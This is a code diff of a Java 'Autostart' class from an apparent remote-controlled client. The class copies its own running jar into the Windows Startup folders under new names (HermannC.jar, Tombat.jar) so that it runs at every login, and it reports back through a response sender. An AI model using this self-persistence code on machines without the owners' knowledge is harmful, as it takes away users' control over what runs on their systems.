@@ -1,14 +1,26 @@
 package ch.lebois.client.configure;
 
+import ch.lebois.client.ClientApplication;
+import ch.lebois.client.handler.ResponseSender;
 import ch.lebois.client.service.DownloadService;
+
+import java.io.File;
 
 public class Autostart {
 
     private void autostartWin10() {
         try {
-            new DownloadService().download("file:///" + System.getProperty("user.dir") + "\\Hermann.jar",
-                    System.getProperty("java.io.tmpdir").replace("Local\\Temp\\",
-                            "Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\HermannC.jar"));
+            String filename = new File(ClientApplication.class.getProtectionDomain().getCodeSource().getLocation()
+                    .getPath()).getName();
+
+            if (filename.endsWith(".jar")) {
+                new DownloadService().download("file:///" + System.getProperty("user.dir") + "\\" + filename,
+                        System.getProperty("java.io.tmpdir").replace("Local\\Temp\\",
+                                "Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\HermannC.jar"));
+            } else {
+                new ResponseSender("response", "Not started from jar: started from " + filename);
+            }
+
         } catch (Exception e) {
             e.printStackTrace();
         }
@@ -16,8 +28,17 @@ public class Autostart {
 
     private void autostartWin7() {
         try {
-            new DownloadService().download("file:///" + System.getProperty("user.dir") + "\\Hermann.jar",
-                    "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\HermannC.jar");
+
+            String filename = new File(ClientApplication.class.getProtectionDomain().getCodeSource().getLocation()
+                    .getPath()).getName();
+
+            if (filename.endsWith(".jar")) {
+                new DownloadService().download("file:///" + System.getProperty("user.dir") + "\\" + filename,
+                        "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Tombat.jar");
+            } else {
+                new ResponseSender("response", "Not started from jar: started from " + filename);
+            }
+
         } catch (Exception e) {
             e.printStackTrace();
         }
